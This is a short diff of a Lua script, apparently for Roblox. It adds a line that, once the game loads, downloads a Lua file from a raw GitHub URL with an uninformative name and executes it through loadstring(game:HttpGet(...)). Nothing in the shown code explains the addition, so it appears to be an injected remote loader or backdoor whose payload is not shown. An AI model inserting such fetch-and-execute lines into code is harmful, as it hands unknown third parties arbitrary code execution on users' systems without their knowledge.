@@ -1,4 +1,7 @@
 repeat task.wait() until game:IsLoaded()
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/robloxoneq-sys/Check/refs/heads/main/jjjj.lua"))()
+task.wait(0.5)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
